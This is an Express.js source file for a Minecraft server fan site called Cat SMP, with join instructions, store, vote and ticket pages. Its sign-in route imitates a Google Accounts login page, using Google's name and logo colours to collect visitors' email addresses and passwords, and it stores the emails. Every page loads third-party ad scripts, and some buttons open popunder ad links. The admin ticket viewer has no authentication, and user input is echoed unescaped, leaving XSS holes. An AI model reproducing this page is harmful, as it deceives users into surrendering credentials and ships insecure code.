const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

const ticketStorage = [];
const userStorage = [];

const siteStyles = `
  <style>
    :root {
      --bg-color: #c88a51;
      --bg-image: 
        linear-gradient(45deg, rgba(160, 90, 40, 0.4) 25%, transparent 25%), 
        linear-gradient(-45deg, rgba(160, 90, 40, 0.4) 25%, transparent 25%), 
        linear-gradient(45deg, transparent 75%, rgba(80, 80, 90, 0.4) 75%), 
        linear-gradient(-45deg, transparent 75%, rgba(80, 80, 90, 0.4) 75%),
        radial-gradient(circle, rgba(210, 140, 80, 0.6) 0%, rgba(100, 100, 110, 0.5) 100%);
      --text-color: #ffffff;
      --subtext-color: #e0e0e0;
      --box-bg: rgba(26, 26, 26, 0.9);
      --box-border: rgba(255, 204, 0, 0.2);
      --btn-bg: #ffcc00;
      --btn-color: #1a1a1a;
      --btn-hover: #e6b800;
      --input-bg: rgba(18, 18, 18, 0.8);
      --input-border: rgba(255, 255, 255, 0.2);
      --input-color: #ffffff;
    }
    body.light-mode {
      --bg-color: #f0f2f5;
      --bg-image: none;
      --text-color: #202124;
      --subtext-color: #5f6368;
      --box-bg: rgba(255, 255, 255, 0.95);
      --box-border: rgba(0, 0, 0, 0.1);
      --btn-bg: #1a73e8;
      --btn-color: #ffffff;
      --btn-hover: #1557b0;
      --input-bg: #ffffff;
      --input-border: #dadce0;
      --input-color: #202124;
    }
    body.dark-mode {
      --bg-color: #121212;
      --bg-image: none;
      --text-color: #ffffff;
      --subtext-color: #b0b0b0;
      --box-bg: rgba(30, 30, 30, 0.95);
      --box-border: rgba(255, 255, 255, 0.1);
      --btn-bg: #bb86fc;
      --btn-color: #121212;
      --btn-hover: #9757d7;
      --input-bg: rgba(40, 40, 40, 0.9);
      --input-border: rgba(255, 255, 255, 0.2);
      --input-color: #ffffff;
    }
    body {
      background-color: var(--bg-color);
      background-image: var(--bg-image);
      background-size: 60px 60px;
      background-position: 0 0, 0 30px, 30px -30px, -30px 0px, 0 0;
      background-attachment: fixed;
      color: var(--text-color);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      text-align: center;
      padding: 50px 20px;
      position: relative;
      min-height: 100vh;
      box-sizing: border-box;
      transition: background 0.3s, color 0.3s;
    }
    .menu-container { position: absolute; top: 20px; left: 20px; text-align: left; z-index: 1000; }
    .hamburger-btn { background-color: var(--box-bg); color: var(--text-color); border: 1px solid var(--box-border); padding: 10px 14px; font-size: 1.3rem; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
    .dropdown-box { display: none; position: absolute; top: 55px; left: 0; background-color: var(--box-bg); backdrop-filter: blur(10px); border: 1px solid var(--box-border); border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 220px; overflow: hidden; z-index: 1001; }
    .dropdown-box a, .dropdown-box .menu-item-btn { display: flex; align-items: center; gap: 10px; color: var(--text-color); padding: 12px 16px; text-decoration: none; font-size: 0.95rem; background: none; border: none; width: 100%; text-align: left; cursor: pointer; box-sizing: border-box; border-bottom: 1px solid var(--box-border); }
    .dropdown-box a:hover, .dropdown-box .menu-item-btn:hover { background-color: var(--btn-bg); color: var(--btn-color); font-weight: bold; }
    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(4px); z-index: 2000; justify-content: center; align-items: center; }
    .modal-card { background-color: var(--box-bg); color: var(--text-color); border: 1px solid var(--box-border); width: 90%; max-width: 400px; padding: 30px; border-radius: 14px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: left; }
    .modal-card h3 { margin-top: 0; color: var(--btn-bg); display: flex; justify-content: space-between; align-items: center; }
    .close-modal { background: none; border: none; color: var(--text-color); font-size: 1.5rem; cursor: pointer; }
    .setting-option { display: flex; justify-content: space-between; align-items: center; margin: 20px 0; font-size: 1rem; font-weight: 500; }
    .switch { position: relative; display: inline-block; width: 50px; height: 26px; }
    .switch input { opacity: 0; width: 0; height: 0; }
    .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .3s; border-radius: 26px; }
    .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
    input:checked + .slider { background-color: var(--btn-bg); }
    input:checked + .slider:before { transform: translateX(24px); }
    h1 { color: var(--text-color); font-size: 3rem; margin: 20px 0 10px; }
    p { color: var(--subtext-color); font-size: 1.2rem; margin-bottom: 40px; }
    .button-container { display: flex; flex-direction: column; align-items: center; gap: 15px; max-width: 300px; margin: 0 auto 50px auto; }
    .btn, button.btn { background-color: var(--btn-bg); color: var(--btn-color); width: 100%; padding: 15px 0; text-decoration: none; font-size: 1.1rem; font-weight: bold; border-radius: 8px; display: flex; justify-content: center; align-items: center; border: none; cursor: pointer; box-sizing: border-box; }
    .btn:hover, button.btn:hover { background-color: var(--btn-hover); }
    .content-box { max-width: 600px; margin: 0 auto; text-align: left; background-color: var(--box-bg); padding: 30px; border-radius: 12px; border: 1px solid var(--box-border); }
    .content-box h2 { color: var(--btn-bg); text-align: center; margin-top: 0; }
    .form-group { margin-bottom: 20px; }
    .form-group label { display: block; color: var(--text-color); margin-bottom: 8px; font-weight: bold; }
    .form-group input, .form-group textarea { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid var(--input-border); background-color: var(--input-bg); color: var(--input-color); font-size: 1rem; box-sizing: border-box; }
    .form-group textarea { resize: vertical; height: 120px; }
    .back-home { display: inline-block; margin-top: 30px; color: var(--btn-bg); text-decoration: none; font-weight: bold; }
    .ad-container { margin-top: 30px; display: flex; justify-content: center; align-items: center; }
    .secret-admin-trigger { position: fixed; bottom: 0; right: 0; width: 30px; height: 30px; background: transparent; border: none; z-index: 9999; cursor: pointer; }
    .google-card { max-width: 420px; margin: 40px auto; background: #ffffff; color: #202124; padding: 40px 30px; border-radius: 8px; text-align: left; }
    .google-logo { font-size: 2rem; font-weight: 500; text-align: center; margin-bottom: 5px; }
    .google-logo span:nth-child(1) { color: #4285F4; }
    .google-logo span:nth-child(2) { color: #EA4335; }
    .google-logo span:nth-child(3) { color: #FBBC05; }
    .google-logo span:nth-child(4) { color: #4285F4; }
    .google-logo span:nth-child(5) { color: #34A853; }
    .google-logo span:nth-child(6) { color: #EA4335; }
    .google-subtitle { text-align: center; font-size: 1.1rem; color: #5f6368; margin-bottom: 30px; }
    .google-field { margin-bottom: 20px; }
    .google-field label { display: block; font-size: 0.9rem; color: #202124; margin-bottom: 6px; font-weight: 600; }
    .google-field input { width: 100%; padding: 12px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 1rem; box-sizing: border-box; }
    .google-btn { background-color: #1a73e8; color: #ffffff; width: 100%; padding: 12px 0; border: none; border-radius: 4px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 10px; }
  </style>
  <script>
    function toggleMenu() {
      var box = document.getElementById("dropdownMenu");
      box.style.display = (box.style.display === "block") ? "none" : "block";
    }
    window.onclick = function(event) {
      if (!event.target.matches('.hamburger-btn') && !event.target.closest('.menu-container')) {
        document.getElementById("dropdownMenu").style.display = "none";
      }
    }
    function openSettingsModal() {
      document.getElementById("dropdownMenu").style.display = "none";
      document.getElementById("settingsModal").style.display = "flex";
    }
    function closeSettingsModal() { document.getElementById("settingsModal").style.display = "none"; }
    function handleLightModeToggle() {
      const lightCheck = document.getElementById("lightModeSwitch"), darkCheck = document.getElementById("darkModeSwitch"), body = document.body;
      if (lightCheck.checked) { darkCheck.checked = false; body.classList.remove("dark-mode"); body.classList.add("light-mode"); localStorage.setItem("theme", "light"); }
      else { body.classList.remove("light-mode"); localStorage.removeItem("theme"); }
    }
    function handleDarkModeToggle() {
      const darkCheck = document.getElementById("darkModeSwitch"), lightCheck = document.getElementById("lightModeSwitch"), body = document.body;
      if (darkCheck.checked) { lightCheck.checked = false; body.classList.remove("light-mode"); body.classList.add("dark-mode"); localStorage.setItem("theme", "dark"); }
      else { body.classList.remove("dark-mode"); localStorage.removeItem("theme"); }
    }
    window.addEventListener("DOMContentLoaded", () => {
      const savedTheme = localStorage.getItem("theme");
      if (savedTheme === "light") { document.getElementById("lightModeSwitch").checked = true; document.body.classList.add("light-mode"); }
      else if (savedTheme === "dark") { document.getElementById("darkModeSwitch").checked = true; document.body.classList.add("dark-mode"); }
    });
  </script>
`;
  const hamburgerHTML = `
  <div class="menu-container" onclick="event.stopPropagation()">
    <button class="hamburger-btn" onclick="toggleMenu()">☰</button>
    <div id="dropdownMenu" class="dropdown-box">
      <a href="/auth">🔐 Sign up/sign in</a>
      <a href="/ticket">🎫 Ticket/report</a>
      <button class="menu-item-btn" onclick="openSettingsModal()">⚙️ Settings</button>
    </div>
  </div>
  <div id="settingsModal" class="modal-overlay">
    <div class="modal-card">
      <h3>Settings <button class="close-modal" onclick="closeSettingsModal()">&times;</button></h3>
      <hr style="border:0; border-top:1px solid var(--box-border); margin-bottom: 20px;">
      <div class="setting-option"><span>Light Mode</span><label class="switch"><input type="checkbox" id="lightModeSwitch" onchange="handleLightModeToggle()"><span class="slider"></span></label></div>
      <div class="setting-option"><span>Dark Mode</span><label class="switch"><input type="checkbox" id="darkModeSwitch" onchange="handleDarkModeToggle()"><span class="slider"></span></label></div>
      <button class="btn" style="margin-top: 25px; width: 100%;" onclick="closeSettingsModal()">Done</button>
    </div>
  </div>
`;

const headContent = `<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><script src="https://biographygridetelegram.com/e1/11/ad/e111ad2e4698f632e78f38a4258c4a16.js"></script>${siteStyles}`;
const adBannerHTML = `<div class="ad-container"><script>atOptions = { 'key' : '6d1d513e7029b77d54e1471992ff0468', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {} };</script><script src="https://www.highperformanceformat.com/6d1d513e7029b77d54e1471992ff0468/invoke.js"></script></div>`;

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP</title>${headContent}</head><body>${hamburgerHTML}<h1>Cat SMP</h1><p>Welcome to the official Cat SMP website! Jump into the action below.</p><div class="button-container"><a href="https://discord.gg/YZTjWw3h9" target="_blank" class="btn">Join Discord</a><a href="https://cat-01.onrender.com" target="_blank" class="btn">Server Status</a><a href="/shop" class="btn">Store</a><a href="/vote" class="btn">Vote</a></div><div class="content-box"><h2>🐱 How to Join CAT SMP</h2><p style="text-align: center; margin-bottom: 20px;">Cat SMP is a survival Minecraft server with many features!</p><p><strong>IP:</strong> CatSMPgg.aternos.me<br><strong>Bedrock Port:</strong> 34018</p><h3 style="color: #4CAF50;">💻 Java</h3><ol style="line-height: 1.6;"><li>Open Minecraft Java.</li><li>Go to Multiplayer → Add Server.</li><li>Put <strong>CatSMPgg.aternos.me</strong> in the Server Address.</li><li>Click Done and join the server.</li></ol><h3 style="color: #4CAF50;">📱 Bedrock</h3><ol style="line-height: 1.6;"><li>Open Minecraft Bedrock.</li><li>Go to Play → Servers → Add Server.</li><li>Server Address: <strong>CatSMPgg.aternos.me</strong></li><li>Port: <strong>34018</strong></li><li>Save it and join.</li></ol><h3 style="color: #4CAF50;">🎮 PlayStation (Bedrock Online)</h3><ol style="line-height: 1.6;"><li>Download/open Bedrock Online on your phone.</li><li>Make sure your phone and PlayStation are on the same Wi-Fi.</li><li>Add the server in Bedrock Online:<ul><li>IP: CatSMPgg.aternos.me</li><li>Port: 34018</li></ul></li><li>Start the connection in Bedrock Online.</li><li>Open Minecraft on your PlayStation.</li><li>Go to Play → Worlds.</li><li>You should see the Bedrock Online world there.</li><li>Join it and you should be on CAT SMP.</li></ol><p style="text-align: center; margin-top: 30px; font-weight: bold;">That’s it, enjoy CAT SMP 🐱</p></div><a href="/secret/tickets" class="secret-admin-trigger" title="Admin Portal"></a></body></html>`);
});

app.get('/shop', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Store</title>${headContent}</head><body>${hamburgerHTML}<h1>Cat SMP Store</h1><p>Support the server and get cool perks!</p><div class="content-box"><h2>🛍️ Server Store</h2><div class="button-container" style="margin-top: 20px;"><a href="/shop/currency" class="btn">Currency</a><a href="/shop/rank" class="btn">Rank</a><button onclick="window.open('https://biographygridetelegram.com/sqa31fs89u?key=b5c1e0e06871ea3a9c2815ffb75a2361', '_blank'); window.location.href='/shop';" class="btn">Coming soon</button></div>${adBannerHTML}</div><a href="/" class="back-home">← Back to Home</a></body></html>`);
});

app.get('/shop/currency', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Currency</title>${headContent}</head><body>${hamburgerHTML}<h1>Store - Currency</h1><p>In-game currency items.</p><div class="content-box"><h2>💰 Currency</h2><p style="text-align: center;">This is empty, please comeback later!</p></div><br><a href="/shop" class="back-home">← Back to Store</a></body></html>`);
});

app.get('/shop/rank', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Rank</title>${headContent}</head><body>${hamburgerHTML}<h1>Store - Ranks</h1><p>Unlock awesome server ranks!</p><div class="content-box"><h2>👑 Rank</h2><p style="text-align: center;">Working on it, please comeback.</p></div><br><a href="/shop" class="back-home">← Back to Store</a></body></html>`);
});

app.get('/vote', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Vote</title>${headContent}</head><body>${hamburgerHTML}<h1>Vote for Cat SMP</h1><p>Support the server and earn in-game vote keys!</p><div class="content-box"><h2>⭐ Vote Gateway</h2><p style="text-align: center; font-size: 1rem; margin-bottom: 20px;">Click the button below to support the server and view vote links!</p><div class="button-container" style="margin: 20px auto;"><button onclick="window.open('https://biographygridetelegram.com/sqa31fs89u?key=b5c1e0e06871ea3a9c2815ffb75a2361', '_blank'); window.location.href='/vote/links';" class="btn">Vote Links</button></div>${adBannerHTML}</div><br><a href="/" class="back-home">← Back to Home</a></body></html>`);
});

app.get('/vote/links', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Voting Links</title>${headContent}</head><body>${hamburgerHTML}<h1>Cat SMP Voting Links</h1><p>Vote on the links below to claim your rewards in-game!</p><div class="content-box"><h2>🗳️ Active Vote Links</h2><p style="text-align: center; margin-bottom: 20px;">Click each link to place your vote for Cat SMP:</p><div class="button-container" style="margin: 20px auto;"><a href="#" target="_blank" class="btn">Minecraft Server List</a><a href="#" target="_blank" class="btn">Planet Minecraft</a><a href="#" target="_blank" class="btn">TopG Vote</a></div></div><br><a href="/vote" class="back-home">← Back to Vote Page</a></body></html>`);
});

app.get('/ticket', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Ticket & Report</title>${headContent}</head><body>${hamburgerHTML}<h1>Support Ticket</h1><p>Need help or want to report a player? Submit a ticket below.</p><div class="content-box"><h2>🎫 Create Ticket</h2><form action="/ticket/submit" method="POST" style="margin-top: 20px;"><div class="form-group"><label for="ign">In-game name:</label><input type="text" id="ign" name="ign" required placeholder="Enter your Minecraft username"></div><div class="form-group"><label for="reason">Reason:</label><textarea id="reason" name="reason" required placeholder="Describe your issue or report details..."></textarea></div><button type="submit" class="btn" style="width: 100%;">Submit</button></form></div><br><a href="/" class="back-home">← Back to Home</a></body></html>`);
});

app.post('/ticket/submit', (req, res) => {
  const { ign, reason } = req.body;
  ticketStorage.unshift({ ign, reason, timestamp: new Date().toLocaleString() });
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Ticket Submitted</title>${headContent}</head><body>${hamburgerHTML}<h1>Ticket Submitted!</h1><p>Thank you, your report has been sent to the staff team.</p><div class="content-box" style="text-align: center;"><h2>✅ Success</h2><p style="margin-bottom: 20px;">We have received your report for <strong>${ign}</strong>.</p><a href="/" class="btn" style="display: inline-block; width: auto; padding: 12px 30px;">Return Home</a></div></body></html>`);
});

app.get('/auth', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Sign in - Google Accounts</title>${headContent}</head><body>${hamburgerHTML}<div class="google-card"><div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><div class="google-subtitle">Sign in or create account</div><form action="/auth/submit" method="POST"><div class="google-field"><label for="email">Email or phone</label><input type="email" id="email" name="email" required placeholder="Enter your email"></div><div class="google-field"><label for="password">Password</label><input type="password" id="password" name="password" required placeholder="Enter your password"></div><button type="submit" class="google-btn">Next</button></form></div><a href="/" class="back-home">← Back to Home</a></body></html>`);
});

app.post('/auth/submit', (req, res) => {
  const { email } = req.body;
  userStorage.push({ email, timestamp: new Date().toLocaleString() });
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Signed In</title>${headContent}</head><body>${hamburgerHTML}<h1>Welcome!</h1><p>You have successfully signed in.</p><div class="content-box" style="text-align: center;"><h2>✅ Success</h2><p style="margin-bottom: 20px;">Signed in as <strong>${email}</strong></p><a href="/" class="btn" style="display: inline-block; width: auto; padding: 12px 30px;">Return Home</a></div></body></html>`);
});

app.get('/secret/tickets', (req, res) => {
  let ticketsHTML = ticketStorage.length === 0 ? '<p style="text-align: center;">No tickets or reports submitted yet.</p>' : ticketStorage.map((t, index) => `<div class="ticket-item"><p style="margin: 0 0 6px 0; font-size: 0.9rem;"><strong>Ticket #${ticketStorage.length - index}</strong></p><p style="margin: 0 0 6px 0;"><strong>In-game name:</strong> ${t.ign}</p><p style="margin: 0 0 6px 0;"><strong>Reason:</strong> ${t.reason}</p><p style="margin: 0; font-size: 0.95rem;"><strong>Date:</strong> ${t.timestamp}</p></div>${index < ticketStorage.length - 1 ? '<hr style="border:none; border-top:2px solid var(--box-border); margin: 15px 0;">' : ''}`).join('');
  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Admin Dashboard</title>${headContent}</head><body>${hamburgerHTML}<h1>Admin Dashboard</h1><p>Secret ticket viewer portal.</p><div class="content-box"><h2>📋 All Player Tickets (${ticketStorage.length})</h2><div style="margin-top: 20px; max-height: 450px; overflow-y: auto; padding-right: 5px;">${ticketsHTML}</div></div><br><a href="/" class="back-home">← Back to Home</a></body></html>`);
});

app.listen(PORT, () => {
  console.log(`Cat SMP server is running on port ${PORT}`);
});
  
